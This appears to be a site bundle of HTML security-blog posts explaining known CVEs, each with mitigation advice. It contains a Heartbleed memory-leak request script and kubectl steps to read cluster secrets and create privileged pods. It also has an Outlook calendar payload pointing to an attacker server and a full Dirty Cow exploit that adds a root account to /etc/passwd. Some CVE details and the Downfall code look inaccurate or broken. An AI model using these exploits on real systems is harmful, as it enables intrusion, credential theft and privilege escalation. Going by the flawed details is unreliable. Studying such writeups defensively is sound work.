&nbsp;&nbsp;payload = b"Hi"<br />
&nbsp;&nbsp;payload_length = 0xFFFF<br />
&nbsp;&nbsp;return struct.pack(">BHH", hb_type, len(payload), payload_length) + payload<br />
def send_heartbeat_request(host, port):<br />
&nbsp;&nbsp;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br />
&nbsp;&nbsp;s.connect((host, port))<br />
&nbsp;&nbsp;s.send(create_heartbeat_request())<br />
&nbsp;&nbsp;response = s.recv(65535)<br />
&nbsp;&nbsp;print("Leaked memory:", response)<br />
send_heartbeat_request("example.com", 443)
          </code>
        </div>

        <h2>Global Chaos and Real-World Impact</h2>
        <p>
          The Heartbleed vulnerability affected a significant portion of the internet, with estimates suggesting that 17% of all secure web servers were compromised. Major companies were forced to take immediate action to patch their systems.
        </p>

        <h2>Detecting Heartbleed</h2>
        <p>
          Security tools like Nmap can be used to detect Heartbleed vulnerabilities. Use the following command:
        </p>
        <div class="code-block">
          <code>
nmap -p 443 --script ssl-heartbleed example.com
          </code>
        </div>

        <h2>Lessons Learned</h2>
        <ul>
          <li><strong>Input Validation:</strong> Validate all inputs, especially lengths and buffer sizes.</li>
          <li><strong>Automated Patching Systems:</strong> Ensure systems are regularly updated.</li>
          <li><strong>Memory Safety Practices:</strong> Use memory-safe programming languages like Rust.</li>
        </ul>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Fg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2024–1001: Kubernetes RBAC Misconfiguration</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2024–1001: Kubernetes RBAC Misconfiguration</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2024–1001?</h2>
        <p>
          Kubernetes relies heavily on Role-Based Access Control (RBAC) to manage permissions. However, in early 2024, CVE-2024–1001 was disclosed, revealing how misconfigured RBAC rules in Kubernetes could allow attackers to gain full control over a cluster. This vulnerability emphasizes the risks of poorly defined access policies.
        </p>

        <h3>RBAC in Kubernetes</h3>
        <p>
          RBAC allows administrators to define who can access resources in a Kubernetes cluster and what actions they can perform. Permissions are granted using Roles, Cluster Roles, and Role Bindings.
        </p>

        <h2>The Vulnerability</h2>
        <p>
          CVE-2024–1001 occurs when overly permissive RBAC configurations allow attackers to escalate privileges. Specifically:
        </p>
        <ul>
          <li>Permissions like “create” or “patch” on sensitive resources (e.g., Pods) can be abused.</li>
          <li>Attackers can deploy malicious workloads, extract secrets, or control the cluster API server.</li>
        </ul>

        <h2>Exploit Workflow</h2>
        <h3>RBAC Misconfiguration</h3>
        <div class="code-block">
          <code>
apiVersion: rbac.authorization.k8s.io/v1<br>
kind: Role<br>
metadata:<br>
&nbsp;&nbsp;namespace: vulnerable-namespace<br>
&nbsp;&nbsp;name: overly-permissive-role<br>
rules:<br>
- apiGroups: [""]<br>
&nbsp;&nbsp;resources: ["pods", "secrets"]<br>
&nbsp;&nbsp;verbs: ["get", "create", "patch"]<br>
          </code>
        </div>
        <p>This Role allows anyone bound to it to create and patch Pods and access secrets in the namespace.</p>

        <h3>Step-by-Step Exploit</h3>
        <ol>
          <li><strong>Gain Initial Access:</strong> Assume the attacker has access to a low-privileged service account in the namespace, bound to the misconfigured Role.</li>
          <li><strong>Create a Malicious Pod:</strong> Use the <code>kubectl</code> command to create a Pod with elevated privileges:
            <div class="code-block">
              <code>
kubectl run malicious-pod --image=alpine --restart=Never -- /bin/sh -c "apk add curl; while true; do sleep 3600; done"
              </code>
            </div>
          </li>
          <li><strong>Access Sensitive Secrets:</strong> Once the Pod is running, exec into it:
            <div class="code-block">
              <code>
kubectl exec -it malicious-pod -- /bin/sh<br>
# Inside the Pod:<br>
curl -s -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \\ <br>
https://kubernetes.default.svc/api/v1/namespaces/vulnerable-namespace/secrets
              </code>
            </div>
          </li>
          <li><strong>Escalate Privileges:</strong> Create Pods with privileged containers:
            <div class="code-block">
              <code>
kubectl apply -f - <<EOF<br>
apiVersion: v1<br>
kind: Pod<br>
metadata:<br>
&nbsp;&nbsp;name: root-access-pod<br>
&nbsp;&nbsp;namespace: kube-system<br>
spec:<br>
&nbsp;&nbsp;containers:<br>
&nbsp;&nbsp;- name: root-access-container<br>
&nbsp;&nbsp;&nbsp;&nbsp;image: alpine<br>
&nbsp;&nbsp;&nbsp;&nbsp;securityContext:<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;privileged: true<br>
&nbsp;&nbsp;&nbsp;&nbsp;command: ["/bin/sh", "-c", "while true; do sleep 3600; done"]<br>
EOF
              </code>
            </div>
          </li>
        </ol>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Enforce the Principle of Least Privilege:</strong> Grant only the minimum permissions necessary for users and service accounts to perform their tasks. Avoid broad permissions like “create” or “patch” on sensitive resources.</li>
          <li><strong>Audit RBAC Policies:</strong> Regularly audit your RBAC configurations to identify overly permissive Roles and ClusterRoles:
            <div class="code-block">
              <code>
kubectl get roles,clusterroles,rolebindings,clusterrolebindings --all-namespaces
              </code>
            </div>
          </li>
          <li><strong>Use Pod Security Standards:</strong> Apply Pod Security Standards (PSS) to restrict privileged Pod creation:
            <div class="code-block">
              <code>
apiVersion: policy/v1beta1<br>
kind: PodSecurityPolicy<br>
metadata:<br>
&nbsp;&nbsp;name: restricted<br>
spec:<br>
&nbsp;&nbsp;privileged: false
              </code>
            </div>
          </li>
          <li><strong>Enable Logging and Monitoring:</strong> Monitor for suspicious activities, such as unauthorized Pod creation or access to secrets. Tools like Falco or Kubernetes Audit Logs can help.</li>
          <li><strong>Use Network Policies:</strong> Restrict Pod-to-Pod communication using Kubernetes Network Policies to limit the attack surface.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          CVE-2024–1001 underscores the importance of careful RBAC configuration in Kubernetes. Misconfigured permissions can open the door to attackers, allowing them to escalate privileges and take over a cluster. By enforcing least privilege, auditing RBAC policies, and using Pod Security Standards, organizations can safeguard their Kubernetes environments.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Ug=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2017–11882: Microsoft Office Memory Corruption Vulnerability</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2017–11882: Microsoft Office Memory Corruption Vulnerability</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2017–11882?</h2>
        <p>
          CVE-2017–11882 is a critical vulnerability within Microsoft Office’s Equation Editor component. This legacy feature, designed for displaying mathematical equations, contains a memory corruption flaw that lets attackers execute malicious code when users open a specially crafted document. Attackers can exploit this weakness to install malware, steal data, or gain full control over a target system with the same permissions as the user.
        </p>

        <h3>Affected Office Versions:</h3>
        <ul>
          <li>Microsoft Office 2007 (Service Pack 3)</li>
          <li>Microsoft Office 2010 (Service Pack 2)</li>
          <li>Microsoft Office 2013 (Service Pack 1)</li>
          <li>Microsoft Office 2016</li>
        </ul>
        <p>
          Despite being patched in November 2017, the Equation Editor vulnerability remains a key target, with unpatched systems or older Office versions still vulnerable.
        </p>

        <h2>How the Vulnerability Works</h2>
        <p>
          This vulnerability allows remote code execution (RCE) by corrupting memory through Office’s Object Linking and Embedding (OLE) feature when opening a malicious document. Here’s how an attack typically unfolds:
        </p>
        <ol>
          <li><strong>Phishing:</strong> The attacker sends an email with an attachment, like a Word or Excel document, designed to exploit CVE-2017–11882.</li>
          <li><strong>User Action:</strong> The user opens the document, unknowingly triggering malicious code within the Equation Editor.</li>
          <li><strong>System Compromise:</strong> The attacker gains control over the system, potentially installing further malware, stealing sensitive data, or using the compromised system to attack other network resources.</li>
        </ol>

        <h2>Why CVE-2017–11882 Remains a Top Target</h2>
        <p>
          This vulnerability is highly favored by cybercriminals and nation-state hackers from countries like China, Russia, and North Korea. Both the Department of Homeland Security and the FBI have flagged it as a frequently exploited vulnerability. Its persistence can be attributed to:
        </p>
        <ul>
          <li><strong>Ease of Exploitation:</strong> Attackers only need to convince users to open a document, making social engineering attacks highly effective.</li>
          <li><strong>Legacy Code:</strong> The Equation Editor, dating back to 2000, is incompatible with modern Office security features, making it difficult to defend without patching.</li>
          <li><strong>Prevalence of Unpatched Systems:</strong> Many organizations, particularly those with older Office versions, haven’t applied Microsoft’s 2017 patch, leaving them vulnerable.</li>
        </ul>

        <h2>How to Protect Against CVE-2017–11882</h2>
        <p>
          With patches readily available, mitigating CVE-2017–11882 is straightforward, yet it requires proactive security practices. Here’s how organizations can protect themselves:
        </p>
        <ol>
          <li><strong>Update Microsoft Office:</strong> Ensure all Office versions are up-to-date with Microsoft’s security patches. Microsoft’s November 2017 patch addresses CVE-2017–11882 and should be applied immediately to unpatched systems.</li>
          <li><strong>Disable the Equation Editor:</strong> If this feature is unnecessary for your organization, disable it. Doing so removes a significant attack vector.</li>
          <li><strong>Use Modern Endpoint Protection:</strong> Employ advanced endpoint security tools that can detect and block malicious document activity. Many modern security solutions offer protections specifically designed to detect CVE-2017–11882 exploitation.</li>
          <li><strong>User Awareness and Training:</strong> Social engineering plays a significant role in the success of attacks exploiting this vulnerability. Educate users on the risks of opening unknown attachments or clicking links in unsolicited emails.</li>
        </ol>

        <h2>Staying Ahead of Persistent Threats</h2>
        <p>
          The continued exploitation of CVE-2017–11882 underscores the importance of regular patching, user education, and layered security defenses. A vulnerability like this, embedded in software many organizations rely on daily, is a stark reminder that cybersecurity requires constant vigilance.
        </p>
        <p>
          By applying patches, disabling unused features, and maintaining a robust security posture, organizations can effectively protect themselves against even the oldest and most persistent threats in today’s digital landscape. In cybersecurity, diligence, and preparedness are the best defenses against exploitation — whether it’s a vulnerability from yesterday or one that emerges tomorrow.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Hg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2023–23397: Microsoft Outlook NTLM Credential Theft</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2023–23397: Microsoft Outlook NTLM Credential Theft</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>How CVE-2023–23397 Works</h2>
        <p>
          The vulnerability exploits how Microsoft Outlook handles reminders and calendar invites. Normally, Outlook processes these items to display notifications and updates. However, in this case, attackers can create a specially crafted message that tricks Outlook into making an outbound connection to a server under the attacker’s control. This connection is made using NTLM authentication, sending the victim’s NTLM credentials and exposing them to potential misuse.
        </p>

        <h3>Exploit Scenario</h3>
        <ol>
          <li>An attacker crafts a malicious email containing a reminder or calendar invite.</li>
          <li>The email specifies a UNC (Universal Naming Convention) path that points to an attacker-controlled server.</li>
          <li>When Outlook receives and processes this email, it automatically tries to access the specified UNC path, triggering NTLM authentication and sending the victim’s credentials to the attacker.</li>
        </ol>

        <h3>Code and Example</h3>
        <div class="code-block">
          <code>
import http.server<br>
import socketserver<br><br>
class MyRequestHandler(http.server.SimpleHTTPRequestHandler):<br>
&nbsp;&nbsp;&nbsp;&nbsp;def do_GET(self):<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f"Received connection from: {self.client_address}")<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.send_response(200)<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.end_headers()<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.wfile.write(b"Hello, you've been logged!")<br><br>
PORT = 8000<br>
handler = MyRequestHandler<br>
with socketserver.TCPServer(("", PORT), handler) as httpd:<br>
&nbsp;&nbsp;&nbsp;&nbsp;print(f"Serving on port {PORT}")<br>
&nbsp;&nbsp;&nbsp;&nbsp;httpd.serve_forever()<br>
          </code>
        </div>

        <h3>Malicious Email Payload Example</h3>
        <div class="code-block">
          <code>
BEGIN:VCALENDAR<br>
VERSION:2.0<br>
BEGIN:VEVENT<br>
UID:123456<br>
SUMMARY:Malicious Reminder<br>
DTSTART;TZID=Europe/London:20231105T090000<br>
ATTACH;VALUE=URI:\\\\attacker-controlled-server.com\\malicious\\path<br>
END:VEVENT<br>
END:VCALENDAR<br>
          </code>
        </div>

        <h2>Impact and Risks</h2>
        <ul>
          <li><strong>Credential Theft:</strong> If an attacker successfully captures NTLM credentials, they can use them to authenticate against other systems on the same network, potentially gaining unauthorized access.</li>
          <li><strong>No User Interaction Needed:</strong> The lack of user interaction makes this vulnerability particularly dangerous, as even vigilant users can fall victim without realizing it.</li>
          <li><strong>Enterprise Threat:</strong> Organizations with a large number of Outlook users are especially at risk, as the exploit can be used to pivot through corporate networks.</li>
        </ul>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Update Microsoft Outlook:</strong> Microsoft has released patches for this vulnerability. Ensure that all systems are updated to the latest version of Outlook.</li>
          <li><strong>Disable SMB Outbound Traffic:</strong> Blocking outbound SMB traffic at the network perimeter can prevent credentials from being sent to an external server.</li>
          <li><strong>Use Protected Users Group:</strong> Members of this group in Active Directory are protected against NTLM authentication.</li>
          <li><strong>Implement NTLM Blocking Policies:</strong> Where possible, configure policies to restrict NTLM authentication and enforce Kerberos.</li>
        </ol>

        <h3>Defensive Example in PowerShell</h3>
        <div class="code-block">
          <code>
Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0" -Name "RestrictSendingNTLMTraffic" -Value "2"
          </code>
        </div>
        <p>
          This command enforces NTLM restrictions, significantly reducing the risk of credential theft.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Vg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Downfall (CVE-2022–40982): Exploiting Speculative Execution in Intel CPUs</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Downfall (CVE-2022–40982): Exploiting Speculative Execution in Intel CPUs</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is Downfall (CVE-2022–40982)?</h2>
        <p>
          In August 2023, a critical vulnerability, CVE-2022–40982, dubbed Downfall, was disclosed. This vulnerability affects Intel x86–64 processors and exploits speculative execution to access sensitive data stored in vector registers. It impacts both consumer CPUs and server-grade Xeon processors, allowing attackers with local access to bypass security boundaries and potentially extract confidential information like encryption keys or passwords.
        </p>

        <h2>Speculative Execution</h2>
        <p>
          Modern CPUs optimize performance by predicting and executing instructions ahead of time through speculative execution. However, speculative execution does not adhere to standard security checks during execution, which creates opportunities for attackers to access restricted data.
        </p>

        <h2>Downfall’s Mechanism</h2>
        <p>
          Downfall specifically exploits speculative execution in Advanced Vector Extensions (AVX). It leverages a use-after-free vulnerability during the speculative execution of AVX instructions to access sensitive data stored in vector registers.
        </p>

        <h2>Conceptual Exploit Example</h2>
        <p>
          Below is a conceptual C pseudocode to demonstrate how speculative execution attacks like Downfall work. This example is strictly for educational purposes only to understand the mechanics of such vulnerabilities.
        </p>
        <div class="code-block">
          <code>
#include &lt;stdio.h&gt;<br>
#include &lt;immintrin.h&gt;  // For AVX instructions<br>
#include &lt;stdint.h&gt;<br><br>

// Step 1: Setup memory and registers<br>
void setup_sensitive_data() {<br>
    volatile char secret[] = "SensitiveData"; // Simulated sensitive data<br>
    __m256i vector_data = _mm256_loadu_si256((__m256i *)secret); // Load data into vector register<br>
}<br><br>

// Step 2: Induce speculative execution<br>
void trigger_speculative_execution(char *probe_array) {<br>
    volatile uint64_t timing;<br>
    int speculative_index = 1024; // An index beyond bounds for speculative execution<br>
    char leaked_value;<br><br>

    // Access array in a way to induce speculative execution<br>
    if (speculative_index &lt; 512) {  // This branch is speculatively executed<br>
        leaked_value = probe_array[speculative_index];<br>
    }<br><br>

    // Measure timing to infer accessed value (side-channel analysis)<br>
    for (int i = 0; i &lt; 256; i++) {<br>
        timing = measure_timing(&amp;probe_array[i * 64]); // Simulated timing measurement<br>
        if (timing &lt; THRESHOLD) {<br>
            printf("Leaked value: %c\\n", i); // Print inferred value<br>
        }<br>
    }<br>
}<br><br>

// Step 3: Measure cache timing (side-channel)<br>
uint64_t measure_timing(void *addr) {<br>
    uint64_t start, end;<br>
    asm volatile (<br>
        "mfence\\n"<br>
        "lfence\\n"<br>
        "rdtsc\\n"      // Read time-stamp counter<br>
        "mov %%rax, %0\\n"<br>
        "mov (%1), %%r8\\n" // Access memory<br>
        "rdtscp\\n"<br>
        "mov %%rax, %1\\n"<br>
        "mfence\\n"<br>
        : "=r"(start), "=r"(end)<br>
        : "r"(addr)<br>
        : "rax", "rbx", "rcx", "r8"<br>
    );<br>
    return end - start;<br>
}<br><br>

// Main Function<br>
int main() {<br>
    char probe_array[256 * 64]; // Array for side-channel timing analysis<br><br>

    setup_sensitive_data();<br>
    trigger_speculative_execution(probe_array);<br><br>

    return 0;<br>
}
          </code>
        </div>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Apply Intel Microcode Updates:</strong> Intel has released microcode updates to mitigate speculative execution vulnerabilities like Downfall. Update your system’s firmware to the latest version provided by your hardware vendor.</li>
          <li><strong>Implement Operating System Mitigations:</strong> Operating system vendors have introduced software-level protections, such as disabling AVX extensions on affected processors when microcode updates are unavailable.</li>
          <li><strong>Restrict Local Access:</strong> Ensure only trusted users have access to systems. Many speculative execution vulnerabilities require local access to exploit.</li>
          <li><strong>Monitor Performance Impact:</strong> Mitigations may degrade performance, especially for workloads heavily reliant on AVX instructions. Assess the trade-offs based on your environment.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          Downfall (CVE-2022–40982) demonstrates the dangers of speculative execution vulnerabilities and the importance of constant vigilance in securing modern computing environments. Organizations must prioritize patching, enforce security policies, and consider performance impacts to balance security and efficiency.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Wg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Dirty Cow (CVE-2016–5195): Privilege Escalation in Linux</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Dirty Cow (CVE-2016–5195): Privilege Escalation in Linux</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is Dirty Cow?</h2>
        <p>
          In 2016, a critical vulnerability in the Linux kernel, known as Dirty Cow (CVE-2016–5195), was disclosed. This privilege escalation flaw exploited a race condition in the kernel’s memory management system, allowing attackers to write to read-only memory mappings. The name “Dirty Cow” comes from its exploitation of the Copy-On-Write (COW) mechanism in Linux.
        </p>

        <h2>What is Copy-On-Write (COW)?</h2>
        <p>
          Copy-On-Write (COW) is a memory optimization technique in Linux where multiple processes share the same memory pages for read operations. If one process tries to modify a shared page, the kernel creates a private copy for that process, ensuring changes don’t affect the original shared memory.
        </p>

        <h2>The Problem</h2>
        <p>
          Dirty Cow arises from a race condition in the kernel’s <code>mmap</code> system call during the handling of COW. By exploiting this condition, an attacker can gain write access to read-only memory, effectively modifying protected files like <code>/etc/passwd</code> or <code>/etc/shadow</code> to escalate privileges.
        </p>

        <h2>Exploitation Workflow</h2>
        <p>The Dirty Cow vulnerability enables an attacker to:</p>
        <ol>
          <li>Create a memory mapping of a file they want to overwrite.</li>
          <li>Exploit the race condition to bypass COW and write directly to the file.</li>
          <li>Modify files like <code>/etc/passwd</code> to add a root user or escalate privileges.</li>
        </ol>

        <h2>Demonstrating Dirty Cow (CVE-2016–5195)</h2>
        <p><strong>Disclaimer:</strong> This demonstration is for educational purposes only. Do not execute this on systems you do not own or have explicit permission to test.</p>

        <h3>Exploit Code</h3>
        <p>Save the following as <code>dirtycow.c</code>:</p>
        <div class="code-block">
          <code>
#include &lt;fcntl.h&gt;<br>
#include &lt;pthread.h&gt;<br>
#include &lt;string.h&gt;<br>
#include &lt;sys/mman.h&gt;<br>
#include &lt;stdio.h&gt;<br>
#include &lt;unistd.h&gt;<br><br>
char *target_file = "/etc/passwd";<br>
char *new_content = "hacked:x:0:0:hacked:/root:/bin/bash\\n";<br>
int f;<br><br>
void *madvise_thread(void *arg) {<br>
    for (int i = 0; i &lt; 1000000; i++) {<br>
        madvise(arg, 100, MADV_DONTNEED);<br>
    }<br>
    return NULL;<br>
}<br><br>
void *write_thread(void *arg) {<br>
    for (int i = 0; i &lt; 1000000; i++) {<br>
        lseek(f, 0, SEEK_SET);<br>
        write(f, new_content, strlen(new_content));<br>
    }<br>
    return NULL;<br>
}<br><br>
int main() {<br>
    f = open(target_file, O_RDONLY);<br>
    if (f &lt; 0) {<br>
        perror("Failed to open target file");<br>
        return 1;<br>
    }<br><br>
    char *map = mmap(NULL, 100, PROT_READ, MAP_PRIVATE, f, 0);<br>
    if (map == MAP_FAILED) {<br>
        perror("mmap failed");<br>
        return 1;<br>
    }<br><br>
    pthread_t t1, t2;<br>
    pthread_create(&amp;t1, NULL, madvise_thread, map);<br>
    pthread_create(&amp;t2, NULL, write_thread, NULL);<br><br>
    pthread_join(t1, NULL);<br>
    pthread_join(t2, NULL);<br><br>
    printf("Exploit complete. Check /etc/passwd for changes.\\n");<br>
    return 0;<br>
}
          </code>
        </div>

        <h3>Compiling and Running the Exploit</h3>
        <div class="code-block">
          <code>
# Compile the exploit<br>
gcc -pthread dirtycow.c -o dirtycow<br><br>
# Run the exploit<br>
./dirtycow<br><br>
# Check for changes<br>
cat /etc/passwd
          </code>
        </div>

        <p>Look for the new root user: <code>hacked:x:0:0:hacked:/root:/bin/bash</code>. You can now switch to this user:</p>
        <div class="code-block">
          <code>su hacked</code>
        </div>

        <h2>Mitigation</h2>
        <ol>
          <li><strong>Patch the Kernel:</strong> Update the Linux kernel to a version where the Dirty Cow vulnerability is fixed.</li>
          <li><strong>Use Access Controls:</strong> Restrict write access to sensitive files like <code>/etc/passwd</code> and <code>/etc/shadow</code> to privileged users only.</li>
          <li><strong>Enable SELinux or AppArmor:</strong> Mandatory Access Control frameworks can prevent unauthorized file modifications.</li>
          <li><strong>Limit Privileges:</strong> Run services and applications with the least privileges necessary to function.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          Dirty Cow serves as a stark reminder of the potential impact of race conditions and privilege escalation vulnerabilities. While the Linux kernel is robust, vulnerabilities like this highlight the need for regular updates, proper system configuration, and defense-in-depth security practices.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,$g=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Firmware Exploration: LLM as Your Annotator</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      line-height: 1.6;
      max-width: 900px;
      margin: 2rem auto;
      padding: 0 1rem;
      color: #111827;
      background: #f9fafb;
    }
    h1, h2, h3 {
      color: #111827;
    }
    h1 {
      font-size: 2.2rem;
      margin-bottom: 0.5rem;
    }
    h2 {
      margin-top: 2rem;
      border-bottom: 1px solid #e5e7eb;
      padding-bottom: 0.25rem;
    }
    h3 {
      margin-top: 1.5rem;
    }
    code {
      font-family: "Fira Code", Menlo, Monaco, Consolas, "Courier New", monospace;
      font-size: 0.9rem;
    }
    pre {
      background: #111827;
      color: #e5e7eb;
      padding: 1rem;
      border-radius: 0.5rem;
      overflow-x: auto;
      font-size: 0.9rem;
    }
    blockquote {
      border-left: 4px solid #3b82f6;
      padding-left: 1rem;
      color: #374151;
      margin: 1rem 0;
      background: #eff6ff;
    }
    ul, ol {
      padding-left: 1.4rem;
    }
    hr {
      border: 0;
      border-top: 1px solid #e5e7eb;
      margin: 2rem 0;
    }
    .emoji {
      font-style: normal;
    }
  </style>
</head>
<body>

  <h1>Firmware Exploration: LLM as Your Annotator</h1>

  <p>
    If you’ve ever opened a firmware image and stared at a hex dump thinking “nope,” you’re not alone.
  </p>

  <p>
    Modern IoT and embedded devices ship with complex firmware: full Linux distributions, RTOS kernels, proprietary bootloaders, custom update mechanisms, and often… questionable security decisions. Large-scale studies have shown that firmware is a gold mine for vulnerabilities, from hard-coded credentials to unsafe update logic and exposed debug interfaces.
  </p>

  <p>
    At the same time, governments and standards bodies are pushing manufacturers to treat firmware security seriously. NIST’s IoT Cybersecurity guidance and documents like SP 800-213/213A explicitly call out firmware, update mechanisms, and device integrity as critical capabilities for secure IoT products.
  </p>

  <p>
